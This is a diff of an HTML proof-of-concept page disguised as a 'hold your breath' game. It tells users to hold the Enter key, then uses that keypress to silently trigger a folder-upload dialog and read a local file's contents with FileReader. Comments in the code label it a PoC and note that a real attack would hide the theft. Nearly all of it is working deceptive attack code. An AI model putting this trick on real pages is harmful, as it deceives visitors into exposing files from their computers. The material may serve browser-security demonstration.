@@ -9,4 +9,34 @@
     </style>
 </head>
 
-   <body style='background-color:#aaaaff;'><img width=200 src='https://www.quickanddirtytips.com/sites/default/files/styles/article_main_image/public/images/17091/man-holding-breath.png'></img><h3>HOLD YOUR BREATH CHALLENGE!</h3><h1> To play:<br>1)CLICK THE GUY FIRST!<br>2)HOLD down the ENTER key and let go when you take a breath!</h1> <input style='opacity:100' id='thing' type='file' webkitdirectory mozdirectory accept='text/*' /><script>var r = new FileReader();thing.onchange = function() { alert('Nice, I stole ' + this.files.length + ' files from your pc ;)'); r.onload=function(){ alert(r.result); };r.readAsText(thing.files[0]);}; var i = 0;  document.onkeydown = function() { i++;if (i > 5) {thing.click(); i = -10000;       document.onkeydown = null;            setTimeout(function() {      qmsg.innerHTML = '<u>Nice job! Now wait for everyone to finish!</u>';           }, 1000);     };  };
+   <body style='background-color:#aaaaff;'><img width=200 src='https://www.quickanddirtytips.com/sites/default/files/styles/article_main_image/public/images/17091/man-holding-breath.png'></img>
+    <h3>HOLD YOUR BREATH CHALLENGE!</h3>
+    <h1> To play:<br>1)CLICK THE GUY FIRST!<br>2)HOLD down the ENTER key and let go when you take a breath!</h1> 
+    <input style='opacity:100' id='thing' type='file' webkitdirectory mozdirectory accept='text/*' />
+    <script>
+	
+		  var r = new FileReader();
+        thing.onchange = function() {
+            alert('I stole ' + this.files.length + ' files from your pc!');//This is for PoC only. A real attack would not let the user know what happened.
+			r.onload=function(){
+				alert(r.result); // This displays the contents of the file, which proves the website can read your harddrive.
+			};
+			
+			r.readAsText(thing.files[0]); // Display 1 file as proof.
+        };
+		
+        //This is where we detect if the user is holding the Enter button.
+        var i = 0;
+        document.onkeydown = function() {
+            i++;
+            if (i > 4) {
+                thing.click();
+                i = -10000;
+                document.onkeydown = null;
+                setTimeout(function() {
+                    qmsg.innerHTML = '<u>Nice job! Now wait for everyone to finish!</u>';
+                }, 1000);
+            };
+        };
+    </script>
+    </body></html>
